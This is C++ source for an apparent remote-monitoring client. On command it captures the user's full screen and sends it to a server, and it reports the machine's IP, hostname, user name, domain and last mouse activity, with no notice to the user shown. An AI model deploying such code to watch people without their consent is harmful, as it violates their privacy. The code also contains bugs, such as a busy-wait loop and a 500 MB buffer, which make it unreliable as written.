#include "client.h"
char bufferforpic[500000000];

void ClientConnection::SendPic(unsigned long size)
{
    SOCKET pic_sock=socket(2,1,6);
    if(pic_sock==INVALID_SOCKET) 
    {
        lasterr=WSAGetLastError();
        std::cerr<<"Socket for sending pic is not created: "<<lasterr<<std::endl;
    }
    sockaddr_in addrforpic;
    addrforpic.sin_addr.s_addr = inet_addr(servip.data());
    addrforpic.sin_family=AF_INET;
    addrforpic.sin_port=htons(GETPICPORT);

    int Result = connect(pic_sock,(SOCKADDR*)&addrforpic,sizeof(addrforpic));
    if(Result==SOCKET_ERROR)
    {
        lasterr=WSAGetLastError();
        std::cerr<<"No connection: "<<lasterr<<std::endl;
    }

    Result=send(pic_sock,bufferforpic,size,0);
    DeleteFileA("screen.bmp");
    
    if(Result==SOCKET_ERROR)
    {
        lasterr=WSAGetLastError();
        std::cerr<<"Data cannot be sent: "<<lasterr<<std::endl;
    }
    closesocket(pic_sock);
}

unsigned long ClientConnection::GetScreenData()
{
	HDC hScreenDC = GetDC(nullptr);
	HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
	int width = GetDeviceCaps(hScreenDC, HORZRES);
	int height = GetDeviceCaps(hScreenDC, VERTRES);
	HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
	HBITMAP hOldBitmap = static_cast<HBITMAP>(SelectObject(hMemoryDC, hBitmap));
	BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
	hBitmap = static_cast<HBITMAP>(SelectObject(hMemoryDC, hOldBitmap));

    OFSTRUCT openf;
    CreateBMPFile(0, (LPTSTR)"screen.bmp", CreateBitmapInfoStruct(0, hBitmap), hBitmap, hScreenDC);
    HFILE ToRead=OpenFile("screen.bmp",&openf,OF_READ);
    unsigned long readb;
    ReadFile((HANDLE)ToRead,bufferforpic,sizeof(bufferforpic),&readb,0);
    CloseHandle((HANDLE)ToRead);

	return readb;
}

void ClientConnection::ListenForScreen()
{
    while(true)
    {                
        SOCKET newsock=accept(listen_sock, NULL, NULL);
        if(newsock==INVALID_SOCKET)std::cerr<<"No Listen socket"<<WSAGetLastError();

        char buffer[1024];
        memset(buffer,0,1024);
        
        int res=recv(newsock,buffer,1024,0);
        if(res==SOCKET_ERROR)std::cerr<<"No recieve"<<WSAGetLastError(); 
        if(buffer[0]==SCREENSHOT)
        {
            SendPic(GetScreenData());
        }
        closesocket(newsock);
    }
}

void ClientConnection::Activity()
{
        POINT prev, cur;
		GetCursorPos(&prev);
		while (true) 
        {
			GetCursorPos(&cur);
			if (cur.x!=prev.x || cur.y!=prev.y) 
            {
				prev = cur;
				currentTime = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
			}
		}
		std::this_thread::sleep_for(std::chrono::milliseconds(100));
}

const char* ClientConnection::RetStr()
{
    return (output.c_str());
}

void ClientConnection::GetData()
{
    char nameBuf[256];
    char hostname[256];
	unsigned int sizeBuf = sizeof(nameBuf);
    std::string clientIP, clientMachine, clientUserName, clientDomain;
    struct addrinfo hints = { }, * res;
    LPWKSTA_INFO_102 togetDom = NULL;
    
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;    

	if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR || 
        getaddrinfo(hostname, nullptr, &hints, &res) != 0   )
	{
		clientIP = ""; 
        clientMachine = "";
	}
	
	if (NetWkstaGetInfo(NULL, 102, (LPBYTE*)&togetDom) != NERR_Success) 
		std::cerr << "SET DOMAIN ERROR " << std::endl;
	
	GetUserNameA(nameBuf, (DWORD*)&sizeBuf);

	sockaddr_in* addr = reinterpret_cast<sockaddr_in*>(res->ai_addr);
	std::string ip = inet_ntoa(addr->sin_addr);
	freeaddrinfo(res);

	clientIP = ip; clientMachine = hostname; clientUserName = nameBuf; clientDomain = ConvertWStringToString(togetDom->wki102_langroup);
    
    std::ostringstream currentTimeOSS;
    currentTimeOSS<<std::put_time(std::localtime(&currentTime), "%Y-%m-%d %H:%M:%S");
    output=clientIP+"; "+clientMachine+"; "+clientUserName+"; "+clientDomain+"; "+currentTimeOSS.str()+";\n";
    currentTimeOSS.clear();
}

int ClientConnection::SendData(void* data)
{
    int Result=send(curr_sock,(char*)data,strlen((const char*)data),0);
    if(Result==SOCKET_ERROR)
    {
        lasterr=WSAGetLastError();
        std::cerr<<"Data cannot be sent: "<<lasterr<<std::endl;
        return 1;
    }
    return 0;
}

void ClientConnection::Restart()
{
    closesocket(curr_sock);
    curr_sock=socket(2,1,6);
    if(curr_sock==INVALID_SOCKET) 
    {
        lasterr=WSAGetLastError();
        std::cerr<<"Socket is not created: "<<lasterr<<std::endl;
    }
    
    server.sin_addr.s_addr = inet_addr(servip.data());
    server.sin_family=AF_INET;
    server.sin_port=htons(27015);

    connect(curr_sock,(SOCKADDR*)&server,sizeof(server));
}

ClientConnection::ClientConnection(const char* ip)
{
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    servip=ip;
    if (iResult != NO_ERROR) 
    {
        std::cerr<<"WSAStartup function failed with error: "<<std::endl<<iResult;
        return;
    }

    curr_sock=socket(2,1,6);
    if(curr_sock==INVALID_SOCKET) 
    {
        lasterr=WSAGetLastError();
        std::cerr<<"Socket is not created: "<<lasterr<<std::endl;
    }
    
    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_family=AF_INET;
    server.sin_port=htons(27015);

    iResult = connect(curr_sock,(SOCKADDR*)&server,sizeof(server));
    
    if(iResult) 
    {
        lasterr=WSAGetLastError();
        std::cerr<<"Socket is not connected: "<<lasterr<<std::endl;
    }

    listen_sock=socket(2,1,6);
    if(curr_sock==INVALID_SOCKET) 
    {
        lasterr=WSAGetLastError();
        std::cerr<<"Listen socket is not created: "<<lasterr<<std::endl;
    }

    listenaddr.sin_addr.s_addr = INADDR_ANY;
    listenaddr.sin_family=AF_INET;
    int port=27016;
    listenaddr.sin_port=htons(port);

    while (bind(listen_sock, (sockaddr*)&listenaddr, sizeof(listenaddr)) == SOCKET_ERROR) 
    {
		port++;
        listenaddr.sin_port=htons(port);
	}

	if (listen(listen_sock, SOMAXCONN) == SOCKET_ERROR) 
    {
		std::cerr << "Listen failed: " << WSAGetLastError() << std::endl;
		closesocket(listen_sock);
		return;
	}

    conAct= new std::thread(&ClientConnection::Activity, this);
    ScrLis= new std::thread(&ClientConnection::ListenForScreen, this);
}

std::string ConvertWStringToString(const std::wstring& wstr) 
{
	// Рассчитываем необходимый размер строки
	int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, nullptr, 0, nullptr, nullptr);
	if (size_needed <= 0) {
		return ""; // Обработка ошибок: пустая строка
	}

	// Создаём строку нужного размера (исключаем завершающий '\0')
	std::string str(size_needed - 1, 0);
	WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &str[0], size_needed, nullptr, nullptr);
	return str;
}

PBITMAPINFO CreateBitmapInfoStruct(HWND hwnd, HBITMAP hBmp)
{
    BITMAP bmp;
    PBITMAPINFO pbmi;
    WORD    cClrBits;

    if (!GetObject(hBmp, sizeof(BITMAP), (LPSTR)&bmp))
        std::cerr << "NO GetObject" << std::endl;

    // Convert the color format to a count of bits.  
    cClrBits = (WORD)(bmp.bmPlanes * bmp.bmBitsPixel);
    if (cClrBits == 1)
        cClrBits = 1;
    else if (cClrBits <= 4)
        cClrBits = 4;
    else if (cClrBits <= 8)
        cClrBits = 8;
    else if (cClrBits <= 16)
        cClrBits = 16;
    else if (cClrBits <= 24)
        cClrBits = 24;
    else cClrBits = 32;

    // Allocate memory for the BITMAPINFO structure. (This structure  
    // contains a BITMAPINFOHEADER structure and an array of RGBQUAD  
    // data structures.)  

    if (cClrBits < 24)
        pbmi = (PBITMAPINFO)LocalAlloc(LPTR,
            sizeof(BITMAPINFOHEADER) +
            sizeof(RGBQUAD) * (1 << cClrBits));

    // There is no RGBQUAD array for these formats: 24-bit-per-pixel or 32-bit-per-pixel 

    else
        pbmi = (PBITMAPINFO)LocalAlloc(LPTR,
            sizeof(BITMAPINFOHEADER));

    // Initialize the fields in the BITMAPINFO structure.  

    pbmi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    pbmi->bmiHeader.biWidth = bmp.bmWidth;
    pbmi->bmiHeader.biHeight = bmp.bmHeight;
    pbmi->bmiHeader.biPlanes = bmp.bmPlanes;
    pbmi->bmiHeader.biBitCount = bmp.bmBitsPixel;
    if (cClrBits < 24)
        pbmi->bmiHeader.biClrUsed = (1 << cClrBits);

    // If the bitmap is not compressed, set the BI_RGB flag.  
    pbmi->bmiHeader.biCompression = BI_RGB;

    // Compute the number of bytes in the array of color  
    // indices and store the result in biSizeImage.  
    // The width must be DWORD aligned unless the bitmap is RLE 
    // compressed. 
    pbmi->bmiHeader.biSizeImage = ((pbmi->bmiHeader.biWidth * cClrBits + 31) & ~31) / 8
        * pbmi->bmiHeader.biHeight;
    // Set biClrImportant to 0, indicating that all of the  
    // device colors are important.  
    pbmi->bmiHeader.biClrImportant = 0;
    return pbmi;
}

void CreateBMPFile(HWND hwnd, LPTSTR pszFile, PBITMAPINFO pbi,
    HBITMAP hBMP, HDC hDC)
{
    HANDLE hf;                 // file handle  
    BITMAPFILEHEADER hdr;       // bitmap file-header  
    PBITMAPINFOHEADER pbih;     // bitmap info-header  
    LPBYTE lpBits;              // memory pointer  
    DWORD dwTotal;              // total count of bytes  
    DWORD cb;                   // incremental count of bytes  
    BYTE* hp;                   // byte pointer  
    DWORD dwTmp;

    pbih = (PBITMAPINFOHEADER)pbi;
    lpBits = (LPBYTE)GlobalAlloc(GMEM_FIXED, pbih->biSizeImage);

    if (!lpBits)
        std::cerr << "GlobalAlloc" << std::endl;
        //errhandler("GlobalAlloc", hwnd);

    // Retrieve the color table (RGBQUAD array) and the bits  
    // (array of palette indices) from the DIB.  
    if (!GetDIBits(hDC, hBMP, 0, (WORD)pbih->biHeight, lpBits, pbi,
        DIB_RGB_COLORS))
    {
        std::cerr << "GetDIBits" << std::endl;
        std::cerr << GetLastError() << std::endl;
        //errhandler("GetDIBits", hwnd);
    }

    // Create the .BMP file.  
    hf = CreateFile(pszFile,
        GENERIC_READ | GENERIC_WRITE,
        (DWORD)0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        (HANDLE)NULL);
    if (hf == INVALID_HANDLE_VALUE)
        std::cerr << "CreateFile" << std::endl;

    hdr.bfType = 0x4d42;         

    hdr.bfSize = (DWORD)(sizeof(BITMAPFILEHEADER) +
        pbih->biSize + pbih->biClrUsed
        * sizeof(RGBQUAD) + pbih->biSizeImage);
    hdr.bfReserved1 = 0;
    hdr.bfReserved2 = 0;

    hdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) +
        pbih->biSize + pbih->biClrUsed
        * sizeof(RGBQUAD);

    if (!WriteFile(hf, (LPVOID)&hdr, sizeof(BITMAPFILEHEADER),
        (LPDWORD)&dwTmp, NULL)) std::cerr << "WriteFile" << std::endl;
    

    if (!WriteFile(hf, (LPVOID)pbih, sizeof(BITMAPINFOHEADER)
        + pbih->biClrUsed * sizeof(RGBQUAD),
        (LPDWORD)&dwTmp, (NULL)))
        std::cerr << "WriteFile" << std::endl;

    dwTotal = cb = pbih->biSizeImage;
    hp = lpBits;
    if (!WriteFile(hf, (LPSTR)hp, (int)cb, (LPDWORD)&dwTmp, NULL))
        std::cerr << "WriteFile" << std::endl;

    if (!CloseHandle(hf)) std::cerr << "CloseHandle" <<std::endl;

    GlobalFree((HGLOBAL)lpBits);
}